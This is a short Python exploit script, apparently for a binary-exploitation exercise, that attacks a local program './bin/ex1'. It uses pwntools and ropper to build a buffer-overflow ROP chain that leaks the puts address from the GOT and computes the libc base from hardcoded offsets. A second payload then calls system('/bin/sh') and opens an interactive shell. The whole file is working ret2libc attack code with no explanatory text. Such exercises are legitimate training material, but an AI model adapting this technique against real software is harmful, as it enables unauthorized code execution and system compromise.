#!/usr/bin/env python3

from ropper import RopperService
from pwn import *

binary = ELF('./bin/ex1', False)
puts_got = 0x0000000000404018 # objdump -R ./bin/ex1
puts_plt = 0x0000000000401050 # objdump -d -M intel ./bin/ex1 | grep puts@plt
main_addr = binary.symbols['main']

pop_rdi_rbp_addr = 0x0000000000401193 # ropper --file ./bin/ex1 --search "pop rdi"

payload = b"A" * 32 + b"B" * 8
payload += p64(pop_rdi_rbp_addr)
payload += p64(puts_got)
payload += p64(0xdeadbeef) # junk
payload += p64(puts_plt)
payload += p64(main_addr)

target = process("./bin/ex1")
target.sendline(payload) 

target.recvline()
target.recvline()

leaked_puts = u64(target.recvline().strip().ljust(8, b'\x00'))
puts_offset = 0x80e50 # readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts

libc_base = leaked_puts - puts_offset

system_addr = libc_base + 0x50d70 # system offset
bin_sh_addr = libc_base + 0x1d8678 # bin_sh offset - strings -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"

libc_file = "/usr/lib/x86_64-linux-gnu/libc.so.6"

rs = RopperService()
rs.addFile(libc_file)
rs.loadGadgetsFor()

pop_rdi_addr = libc_base + next(rs.search(search="pop rdi; ret;"))[1].address

payload = b"A" * 32 + b"B" * 8
payload += p64(pop_rdi_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

target.send(payload)
target.interactive()
